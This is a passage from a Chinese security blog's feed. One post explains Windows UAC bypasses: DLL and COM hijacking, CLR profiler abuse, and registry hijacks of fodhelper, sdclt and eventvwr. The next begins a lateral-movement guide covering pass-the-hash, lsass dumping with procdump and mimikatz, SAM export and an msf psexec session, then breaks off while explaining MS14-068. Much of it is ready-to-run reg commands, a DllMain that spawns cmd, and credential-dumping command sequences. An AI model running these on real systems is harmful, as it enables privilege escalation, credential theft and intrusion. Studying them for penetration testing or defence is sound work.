alt="image-20210302125851318"></p><p>highestAvailable：此程序以当前用户能获取到的最高权限运行。当你在管理员账户下运行此程序就会要求权限提升以及弹出UAC框。当你在标准账户下运行此程序，由于此账户的最高权限就是标准账户，所以双击便运行</p><h1 id="白名单程序"><a href="#白名单程序" class="headerlink" title="白名单程序"></a>白名单程序</h1><p>除了刚刚说的autoelevate，还有一类叫白名单程序的应用程序也是打开默认提权的。如服务管理工具下的许多应用都属于白名单程序，而其中又有些程序执行时需要依赖CLR支持（如事件查看器，任务计划程序）</p><h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>reference:<a href="https://www.anquanke.com/post/id/209033">https://www.anquanke.com/post/id/209033</a><br><a href="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p><p>exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是</p><ul><li><p>程序所在目录</p></li><li><p>系统目录即<code>SYSTEM32</code>目录</p></li><li><p>16位系统目录即<code>SYSTEM</code>目录</p></li><li><p><code>Windows</code>目录</p></li><li><p>程序加载目录(<code>SetCurrentDirecctory</code>)</p></li><li><p><code>PATH</code>环境变量中列出的目录</p><p>同时，dll加载也遵循着<code>Know DLLs注册表项</code>的机制：Know DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLS处可以看见这些dll</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301184035776.png" alt="image-20210301184035776"></p></li></ul><p>在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。</p><p>如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径：</p><p>（1） DLL替换：用恶意的DLL替换掉合法的DLL<br>（2） DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。<br>（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL<br>（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。<br>（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的恶意DLL替换为合法的DLL。此方法通常也被称为DLL侧加载<br>（6） 相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</p><h4 id="实践出真知1"><a href="#实践出真知1" class="headerlink" title="实践出真知1"></a>实践出真知1</h4><p>这里我们先用第一种方法来进行实验，实验对象是C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132631680.png" alt="image-20210302132631680"></p><p>由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132724843.png" alt="image-20210302132724843"></p><p>bypassuac成功。 当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，这种洞该怎么去找。</p><h4 id="实践出真知2"><a href="#实践出真知2" class="headerlink" title="实践出真知2"></a>实践出真知2</h4><p>这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。</p><p>我们process monitor设置过滤如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302205938167.png" alt="image-20210302205938167"></p><p>cmd运行 mmc eventvwr.msc,查看调用</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302210053342.png" alt="image-20210302210053342"></p><p>dll搜索顺序确实是 程序目录-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）-&gt;PATH目录。</p><p>我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行</p><p>但是无奈我这里环境是win7 sp1,但是这个洞7600才出现，所以复现不了了。但大概思路就是这样的</p><h2 id="CLR加载任意DLL"><a href="#CLR加载任意DLL" class="headerlink" title="CLR加载任意DLL"></a>CLR加载任意DLL</h2><p>CLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。</p><p>至于这个dll如何给CLR，是通过修改以下环境变量实现的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COR_ENABLE_PROFILING &#x3D; 1</span><br><span class="line"></span><br><span class="line">COR_PROFILER&#x3D;&#123;CLSIDor ProgID&#125;</span><br></pre></td></tr></table></figure><p>CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。<br>在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载<br>net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。<br>总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。</p><p>接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。<br>以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径. 然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system(“cmd.exe”)  那么就会蹦出来高权限cmd窗口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; &#x2F;ve &#x2F;t REG_EXPAND_SZ &#x2F;d &quot;C:\test\calc.dll&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_PROFILER&quot; &#x2F;t REG_SZ &#x2F;d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_ENABLE_PROFILING&quot; &#x2F;t REG_SZ &#x2F;d &quot;1&quot; &#x2F;f</span><br><span class="line">mmc gpedit.msc</span><br></pre></td></tr></table></figure><p>但我死活复现不起不知道为啥，我的dll这样写的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    char cmd[] &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line"></span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        WinExec(cmd, SW_SHOWNORMAL);</span><br><span class="line">        ExitProcess(0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外的，你还可以为COR_PROFILER_PATH设置为如\\server\share\test.dll的smb的路径，这样也可以实现bypassuac（没复现）</p><h2 id="白名单程序-1"><a href="#白名单程序-1" class="headerlink" title="白名单程序"></a>白名单程序</h2><h3 id="odbcad32-exe"><a href="#odbcad32-exe" class="headerlink" title="odbcad32.exe"></a>odbcad32.exe</h3><p>这个方法很简单。打开C:\Windows\system32\odbcad32.exe，然后通过以下方法打开powershell或者cmd</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302133941728.png" alt="image-20210302133941728"></p><p>成功bypass</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302134014137.png" alt="image-20210302134014137"></p><h3 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h3><p>之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例</p><p>操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell    以此内推，还有很多相似的管理工具可以这样利用</p><h2 id="注册表劫持"><a href="#注册表劫持" class="headerlink" title="注册表劫持"></a>注册表劫持</h2><h3 id="Fodhelper-exe"><a href="#Fodhelper-exe" class="headerlink" title="Fodhelper.exe"></a>Fodhelper.exe</h3><p>Fodhelper.exe win10才有，所以只有win10能通过这个办法bypassuac，他是一个autoelevate元素程序</p><p>我们使用proceemonitor查看事件查看器启动的时候执行了什么。我们通过排查发现了此处</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302194843185.png" alt="image-20210302194843185"></p><p>发现程序试图打开HKCU\Software\Classes\ms-settings\shell\open\command，但是这个项没有找到，因为这个项并不存在，于是它查询 HKCR\ms-settings\Shell\Open,查询成功便打开其下的Command键进行查询。<br>我们可以劫持注册表，往HKCU\Software\Classes\ms-settings\shell\open\command写入恶意指令从而达到bypassuac的目的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command &#x2F;v DelegateExecute &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><p>我们写入如下命令，就能让Fodhelper.exe 执行时自动高权限执行cmd窗口了</p><p>然后消除痕迹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command&quot;</span><br></pre></td></tr></table></figure><h3 id="sdclt"><a href="#sdclt" class="headerlink" title="sdclt"></a>sdclt</h3><p>Win10后这个程序才有自动提升权限的能力</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f </span><br><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; &#x2F;v &quot;DelegateExecute&quot; &#x2F;f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302201240945.png" alt="image-20210302201240945"></p><h3 id="eventvmr"><a href="#eventvmr" class="headerlink" title="eventvmr"></a>eventvmr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; &#x2F;d C:\Windows\System32\cmd.exe &#x2F;f</span><br></pre></td></tr></table></figure><p>win10，win7均无效,不知道是哪个版本的事了，反正记录下来吧。</p><h2 id="COM劫持"><a href="#COM劫持" class="headerlink" title="COM劫持"></a>COM劫持</h2><p>和dll劫持类似，应用程序在运行时也会去加载指定CLSID的COM组件，其加载顺序如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID</span><br><span class="line">HKCR\CLSID</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</span><br></pre></td></tr></table></figure><p>以eventvwr为例</p><p>执行该程序时会去寻找{0A29FF9E-7F9C-4437-8B11-F424491E3931}这个组件，这个组件又需要加载InProcServer32指定的DLL，而这个DLL的路径可由用户定义。</p><p>而eventvwr的这个组件一般在HKCR\CLSID找到，所以可以搜索路径劫持。</p><p>利用以下方法可以劫持（搜索路径劫持）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InProcServer32 &#x2F;v &quot;&quot; &#x2F;t REG_SZ &#x2F;d &quot;d:\msf_x64.dll&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InProcServer32 &#x2F;v &quot;LoadWithoutCOM&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InProcServer32 &#x2F;v &quot;ThreadingModel&quot; &#x2F;t REG_SZ &#x2F;d &quot;Apartment&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ShellFolder &#x2F;v &quot;HideOnDesktop&quot; &#x2F;t REG_SZ &#x2F;d &quot;&quot; &#x2F;f </span><br><span class="line"></span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ShellFolder &#x2F;v &quot;Attributes&quot; &#x2F;t REG_DWORD &#x2F;d 0xf090013d &#x2F;f</span><br></pre></td></tr></table></figure><h2 id="利用com接口"><a href="#利用com接口" class="headerlink" title="利用com接口"></a>利用com接口</h2><h3 id="ICMLuaUtil"><a href="#ICMLuaUtil" class="headerlink" title="ICMLuaUtil"></a>ICMLuaUtil</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210304122737764.png" alt="image-20210304122737764"></p><h1 id="UACME"><a href="#UACME" class="headerlink" title="UACME"></a>UACME</h1><p>一个开源项目，记录了许多Bypassuac的方法。</p><p><a href="https://github.com/hfiref0x/UACME/tree/v3.2.x">https://github.com/hfiref0x/UACME/tree/v3.2.x</a></p><h1 id="windbg调试"><a href="#windbg调试" class="headerlink" title="windbg调试"></a>windbg调试</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UAC&quot;&gt;&lt;a href=&quot;#UAC&quot; class=&quot;headerlink&quot; title=&quot;UAC&quot;&gt;&lt;/a&gt;UAC&lt;/h1&gt;&lt;p&gt;用户帐户控制（User Account Control，简写作UAC)是&lt;a href=&quot;https://baike.baidu.c</summary>
      
    
    
    
    
    <category term="提权" scheme="http://const27.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>横向移动与域控权限维持方法总汇</title>
    <link href="http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/"/>
    <id>http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/</id>
    <published>2021-06-28T13:51:58.227Z</published>
    <updated>2021-08-03T04:44:49.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了<br>其中若hash加密方式是 rc4 ，那么就是pass the hash<br>若加密方式是aes key,那么就是pass the key<br>注意NTLM和kerberos协议均存在PTH:<br>NTLM自然不用多说<br>kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响</p><p>那前提就是要获取hash值了</p><h3 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a><strong>KB2871997</strong></h3><p>如果系统安装<strong>KB2871997</strong>补丁或者系统版本大于等于window server 2012时(服务器版本),大于等于win8.1(家庭版本)时（自带补丁），默认在lsass.exe这个进程中不会再将可逆的密文缓存在自己的进程内存中，所以我们默认是没办法通过读取这个进程然后逆向该密文来获取明文密码</p><p>虽然可以通过修改注册表来使LSASS强制存储明文密码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure><p>但是这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。</p><p>同时比较重要的一点是增加了Protected Users组，所属用户会被强制要求使用Kerberos认证，可以避免PTH攻击，以及用户注销后删除凭证(明文密码、LM/NTLM HASH、Kerberos的TGT票据等)</p><p>以及：Restricted Admin RDP模式的远程桌面客户端支持</p><h3 id="关于KB2871997的一个误解"><a href="#关于KB2871997的一个误解" class="headerlink" title="关于KB2871997的一个误解"></a>关于KB2871997的一个误解</h3><p>自window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash。</p><p>很多人把这个原因归结于KB2871997补丁，实际上不然，这个事情的成因实际是UAC在捣乱。UAC是window Vista的新安全组件，具体是个啥这里也不细说了。<br>RID为500的账户和属于本地administrators组的域用户在通过网络远程链接时，默认就是高权限令牌。<br>而非RID500的本地账户则为低权限令牌，若想提升权限则需通过交互方式登录到要通过远程协助或远程桌面管理的计算机走UAC提权。</p><p>关于这个成因的一些系统配置选项：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202713388.png" alt="image-20210726202713388"></p><p>这个项默认允许内置管理员账户（RID500账户）在所有应用下都以高权限令牌运行。这也是RID500账户能PTH的原因</p><p>以及此注册表项，可以关闭UAC的远程限制，即远程连接时UAC会失效，这样的话只要是administrators组的用户都能PTH辣。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202837971.png" alt="image-20210726202837971"></p><p>其中该值为0则代表开启UAC的远程限制,设置该值为1时</p><h3 id="HASH获取"><a href="#HASH获取" class="headerlink" title="HASH获取"></a>HASH获取</h3><p>1.使用meterpreter里的mimikatz模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;load mimikatz</span><br><span class="line">meterpreter&gt;mimikatz_command -f mimikatz的指令</span><br><span class="line">privilege::debug 提权  samdump::hashes dump哈希  </span><br><span class="line">或者</span><br><span class="line">meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst</span><br></pre></td></tr></table></figure><p>2.使用meterpreter自带的hash获取模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump   (推荐使用这个)</span><br></pre></td></tr></table></figure><p>3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理<br>意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可</p><p>4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希</p><p>procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp</span><br><span class="line">然后将其传回本地</span><br><span class="line">通过mimikatz.exe分别执行以下命令</span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130719.png" alt="QQ截图20210217130719"></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br><a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p>5.使用cobalt strike 获取hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br><span class="line">beacon&gt;mimikatz mimikatz指令</span><br></pre></td></tr></table></figure><p>6.利用sam表</p><p>mimikatz在线读sam表中的hash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p>将sam表下载到本地由mimikatz分析</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析</span><br><span class="line">mimikatz运行</span><br><span class="line">mimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : STU1</span><br><span class="line">SysKey : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line">Local SID : S-1-5-21-1982601180-2087634876-2293013296</span><br><span class="line"></span><br><span class="line">SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : liukaifeng01</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure><h3 id="hash-传递攻击-PTH-（Pass-the-Hash"><a href="#hash-传递攻击-PTH-（Pass-the-Hash" class="headerlink" title="hash 传递攻击 PTH （Pass the Hash)"></a>hash 传递攻击 PTH （Pass the Hash)</h3><p>1.msf里使用psexec模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec  &#x2F;&#x2F;以root启动msf</span><br><span class="line">[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133</span><br><span class="line">lhsot &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133</span><br><span class="line">lhost &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443</span><br><span class="line">lport &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138</span><br><span class="line">rhost &#x3D;&gt; 192.168.52.138</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser &#x3D;&gt; Administrator</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5  &#x2F;&#x2F;一般选择NTLM HASH</span><br><span class="line">SMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run</span><br></pre></td></tr></table></figure><p>2.使用mimikatz</p><p>我们在目标机里放置mimikatz.exe 然后执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  &#x2F;&#x2F;自行修改</span><br></pre></td></tr></table></figure><p>之后便会弹出一个cmd窗口，在这个窗口里链接机器即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.222.131\c$</span><br></pre></td></tr></table></figure><p>3.使用cobalt strike</p><p>在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130746.png" alt="QQ截图20210217130746"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130806.png" alt="QQ截图20210217130806"></p><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>这个洞的危害很大，可以让任意域用户提权到域管。<br>适用版本: server 2000以上<br>补丁: kb3011780</p><h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>PAC是kerberos协议里用来解决用户权限功能所设计出的东西。<br>在kerberos协议里面，一个用户用自己的hash拿到了TGT，接着凭借着TGT拿到了TGS，接着用TGS去访问服务。看似只要hash正确，用户就能到处访问服务，但是所有服务都可以给这个用户所访问吗？肯定是不行的，所以微软在kerberos为了实现用户权限分级，采用了PAC。<br>PAC被设计为存在于TGT里面。完整的kerberos权限验证流程如下。</p><p>1。用户凭借自己的hash加密时间戳并发送明文用户名到KDC，KDC认证用户成功后返回被krbtgt用户hash加密的TGT(内有ticekt包含着PAC)，以及用户自身hash加密的login session key</p><p>2.用户凭借TGT票据向KDC发起指定服务的TGS_REQ。KDC用krbtgt hash解密，若解密成功则直接返回服务hash加密的TGS（这里并没考虑用户的权限，直接返回了TGS）</p><p>3.用户用TGS向服务发起请求，服务用自己的hash解密TGS后获得PAC，拿着PAC向KDC询问该用户是否有权限访问。KDC拿到PAC后再次解密，得到了PAC里的 用户的sid，以及所在的组，再判断用户是否有访问服务的权限（有些服务不会验证KDC，这样就会导致白银票据攻击)</p><p>PAC自身的结构</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131035.png" alt="QQ截图20210217131035"></p><p>PAC在Ticket中的结构</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131108.png" alt="QQ截图20210217131108"></p><p>又这个图可以知道,PAC只不过是ticket里Authorization DATA的一个分支。<br>而Authorization data的结构是这样的</p><p>AuthorizationData    ::= SEQUENCE OF SEQUENCE {<br>ad-type     [0] Int32,<br>ad-data     [1] OCTET STRING }</p><p>ad-type中就有这么一个类型 AD-IF-RELEVANT 对应数字1,由上上图可知这是PAC的外壳。<br>若类型为 AD-IF-RELEVAN ,那么ad-data也是一个 AuthorizationData类型的结构体，也有ad-type 和ad-data.那么这个外壳ad-data的ad-type就是次外壳AD-WIN2K-PAC 了,与 AD-WIN2K-PAC 这个ad-type对应的ad-data就是一段连续空间。 这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER 。<br>PACTYPE包含的是 cBuffers,版本以及缓冲区 